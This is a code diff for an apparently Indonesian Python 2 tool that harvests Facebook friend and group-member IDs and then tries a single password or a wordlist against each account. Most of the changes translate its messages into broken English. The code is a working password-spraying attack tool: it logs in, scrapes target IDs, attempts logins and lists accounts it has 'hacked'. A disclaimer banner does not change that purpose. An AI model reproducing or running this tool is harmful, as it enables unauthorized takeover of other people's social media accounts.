@@ -8,17 +8,18 @@ def tampil(x):
 	x=x.replace('\r0','\033[0m')
 	print(x)
 if platform.python_version().split('.')[0] != '2':
-	tampil('\rm[!] kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
+	tampil('\rm[!] you are using python version %s please upgrade version 2.x.x'%v().split(' ')[0])
 	os.sys.exit()
 import cookielib,re,urllib2,urllib,threading
 try:
 	import mechanize
 except ImportError:
-	tampil('\rm[!]SepertiNya Module \rcmechanize\rm belum di install...')
+	tampil('\rm[!]i think you not command \rcmechanize\rm why?...')
+	tampil('\rm[!]typing this command \rcpip2 install mechanize\rm to use')
 	os.sys.exit()
 def keluar():
 	simpan()
-	tampil('\rm[!]Keluar')
+	tampil('\rm[!]EXIT')
 	os.sys.exit()
 log = 0
 id_bteman = []
@@ -32,7 +33,7 @@ br.set_handle_referer(True)
 br.set_cookiejar(cookielib.LWPCookieJar())
 br.set_handle_redirect(True)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Chrome/51.0.2228.0 Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent','Opera/9.80 (Android; Chrome/51.0.2228.0. U; id) Opera Mini/32.0.2254/85 Presto/2.12.423 Version/12.16')]
 def bacaData():
 	global fid_bgroup,fid_bteman
 	try:
@@ -46,17 +47,17 @@ def inputD(x,v=0):
 		try:
 			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
 		except:
-			tampil('\n\rm[!]Batal')
+			tampil('\n\rm[!]Cancel')
 			keluar()
 		if v:
 			if a.upper() in v:
 				break
 			else:
-				tampil('\rm[!]Masukan Opsinya Bro...')
+				tampil('\rm[!]insert choose brother...')
 				continue
 		else:
 			if len(a) == 0:
-				tampil('\rm[!]Masukan dengan benar')
+				tampil('\rm[!]insert correct typing please')
 				continue
 			else:
 				break
@@ -89,13 +90,13 @@ def simpan():
 		except:
 			tampil('\rm[!]Gagal meyimpan')
 def buka(d):
-	tampil('\rh[*]Membuka \rp'+d)
+	tampil('\rh[*]opening \rp'+d)
 	try:
 		x = br.open(d)
 		br._factory.is_html = True
 		x = x.read()
 	except:
-		tampil('\rm[!]Gagal membuka \rp'+d)
+		tampil('\rm[!]cant open \rp'+d)
 		keluar()
 	if '<link rel="redirect" href="' in x:
 		return buka(br.find_link().url)
@@ -104,8 +105,9 @@ def buka(d):
 def login():
 	global log
 	us = inputD('[?]Email/HP')
+	tampil('\rh[*]info=kata sandi mean is password')
 	pa = inputD('[?]Kata Sandi')
-	tampil('\rh[*]Sedang Login....')
+	tampil('\rh[*]wait to login....')
 	buka('https://m.facebook.com')
 	br.select_form(nr=0)
 	br.form['email']=us
@@ -113,17 +115,18 @@ def login():
 	br.submit()
 	url = br.geturl()
 	if 'save-device' in url or 'm_sess' in url:
-		tampil('\rh[*]Login Berhasil')
+		tampil('\rh[*]Login success to using this tools')
 		buka('https://mobile.facebook.com/home.php')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
-		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
+		tampil('\rh[*]welcome brother \rk%s\n\rh[*]maybe you can lucky today....'%nama)
 		log = 1
 	elif 'checkpoint' in url:
-		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
+		tampil('\rm[!]you account need permission to using my tools')
+		print('\n\rk[!]open you facebook account to acces this tool')
 		keluar()
 	else:
-		tampil('\rm[!]Login Gagal')
+		tampil('\rm[!]Login using facebook, and using this tools again')
 def saring_id_teman(r):
 	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
 		id_bteman.append(i)
@@ -141,21 +144,21 @@ def saring_id_group0():
 	global id_group
 	while 1:
 		id_group = inputD('[?]Id Group')
-		tampil('\rh[*]Mengecek Group....')
+		tampil('\rh[*]checking you requests....')
 		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
 		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
 		try:
 			next = br.find_link(url_regex= '/browse/group/members/').url
 			break
 		except:
-			tampil('\rm[!]Id yang anda masukan salah')
+			tampil('\rm[!]wrong number ID group')
 			continue
 	tampil('\rh[*]Mengambil Id dari group \rc%s'%nama)
 	saring_id_group1(a)
 	return next
 def idgroup():
 	if log != 1:
-		tampil('\rh[*]Login dulu bos...')
+		tampil('\rh[*]Login first to requests list my friendgroup...')
 		login()
 		if log == 0:
 			keluar()
@@ -165,17 +168,17 @@ def idgroup():
 		try:
 			next = br.find_link(url_regex= '/browse/group/members/').url
 		except:
-			tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
+			tampil('\rm[!]only scan taked \rh %d id'%len(id_bgroup))
 			break
 	simpan()
-	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
+	i = inputD('[?]continue Crack{typing y} or not {typing t} (y/t)',['Y','T'])
 	if i.upper() == 'Y':
 		return crack(id_bgroup)
 	else:
 		return menu()
 def idteman():
 	if log != 1:
-		tampil('\rh[*]Login dulu bos...')
+		tampil('\rh[*]Login first to see list my friend...')
 		login()
 		if log == 0:
 			keluar()
@@ -184,19 +187,19 @@ def idteman():
 		next = br.find_link(url_regex= 'friends_center_main').url
 	except:
 		if len(id_teman) != 0:
-			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rm[!]Only scan typing \rp%d id'%len(id_bteman))
 		else:
-			tampil('\rm[!]Batal')
+			tampil('\rm[!]cancel')
 			keluar()
 	while 1:
 		saring_id_teman(buka(next))
 		try:
 			next = br.find_link(url_regex= 'friends_center_main').url
 		except:
-			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rm[!]only scan taking \rp%d id'%len(id_bteman))
 			break
 	simpan()
-	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
+	i = inputD('[?]continue Crack{typing y} or not {typing t} (y/t)',['Y','T'])
 	if i.upper() == 'Y':
 		return crack(id_bteman)
 	else:
@@ -224,22 +227,22 @@ class mt(threading.Thread):
         else:
             self.a = 0
 def crack(d):
-	i = inputD('[?]Pake Passwordlist/Manual (p/m)',['P','M'])
+	i = inputD('[?]using Passwordfile/Manual typing (p/m)',['P','M'])
 	if i.upper() == 'P':
 		while 1:
-			dir = inputD('[?]Masukan alamat file')
+			dir = inputD('[?]insert passwordfile on directory')
 			try:
 				D = open(dir,'r').readlines()
 			except:
-				tampil('\rm[!]Gagal membuka \rk%s'%dir)
+				tampil('\rm[!]error open  \rk%s'%dir)
 				continue
 			break
-		tampil('\rh[*]Memulai crack dengan \rk%d password'%len(D))
+		tampil('\rh[*]starting crack with \rk%d password'%len(D))
 		for i in D:
 			i = i.replace('\n','')
 			if len(i) != 0:
 				crack0(d,i,0)
-		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
+		i = inputD('[?]try again press y? or not press t (y/t)',['Y','T'])
 		if i.upper() == 'Y':
 			return crack(d)
 		else:
@@ -247,8 +250,8 @@ def crack(d):
 	else:
 		return crack0(d,inputD('[?]Sandi'),1)
 def crack0(data,sandi,p):
-	tampil('\rh[*]MengCrack \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
-	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
+	tampil('\rh[*]Cracking \rk%d Account \rhwith password \rm[\rk%s\rm]'%(len(data),sandi))
+	print('\033[32;1m[*]Cracking loading \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
 	os.sys.stdout.flush()
 	akun_jml = []
 	akun_sukses = []
@@ -290,15 +293,16 @@ def crack0(data,sandi,p):
 			keluar()
 	print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
 	if len(akun_sukses) != 0:
-		tampil('\rh[*]Daftar akun sukses')
+		tampil('\rh[*]list you lucky hack')
 		for i in akun_sukses:
 			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
-	tampil('\rh[*]Jumlah akun berhasil\rp      %d'%len(akun_sukses))
-	tampil('\rm[*]Jumlah akun gagal\rp         %d'%len(akun_gagal))
-	tampil('\rk[*]Jumlah akun cekpoint\rp      %d'%len(akun_cekpoint))
-	tampil('\rc[*]Jumlah akun error\rp         %d'%len(akun_error))
+	tampil('\rh[*]this account was hack\rp      %d'%len(akun_sukses))
+	tampil('\rm[*]this account not hack\rp         %d'%len(akun_gagal))
+	tampil('\rk[*]this account was cekpoint\rp      %d'%len(akun_cekpoint))
+	tampil('\rc[*]this account error\rp         %d'%len(akun_error))
 	if p:
-		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
+		i = inputD('[?]dont see anything result,try again (y/t)',['Y','T'])
+		print('\r\033[32;1m[*]info typing: y is yes, and t is not')
 		if i.upper() == 'Y':
 			return crack(data)
 		else:
@@ -308,7 +312,7 @@ def crack0(data,sandi,p):
 def lanjutT():
 	global fid_bteman
 	if len(fid_bteman) != 0:
-		i = inputD('[?]Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
+		i = inputD('[?]Using another ID friendlist/continue my work before{recommended typing r} (r/l)',['R','L'])
 		if i.upper() == 'L':
 			return crack(fid_bteman)
 		else:
@@ -318,7 +322,7 @@ def lanjutT():
 def lanjutG():
 	global fid_bgroup
 	if len(fid_bgroup) != 0:
-		i = inputD('[?]Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
+		i = inputD('[?]using another Id Group/continue my work before,{recommended typing r} (r/l)',['R','L'])
 		if i.upper() == 'L':
 			return crack(fid_bgroup)
 		else:
@@ -334,8 +338,8 @@ def menu():
 # \rhGitHub\rp                      https://github.com/pirmansx \rk#
 #       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
 ###########################################################''')
-	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
-	i = inputM('[?]PILIH',[1,2,3])
+	tampil('''\rk%s\n\rc1 \rhTake ID from my group\n\rc2 \rhTake id from my list friend\n\rc3 \rmEXIT THIS TOOLS\n\rk%s'''%('#'*20,'#'*20))
+	i = inputM('[?]Choose',[1,2,3])
 	if i == 1:
 		lanjutG()
 		idgroup()
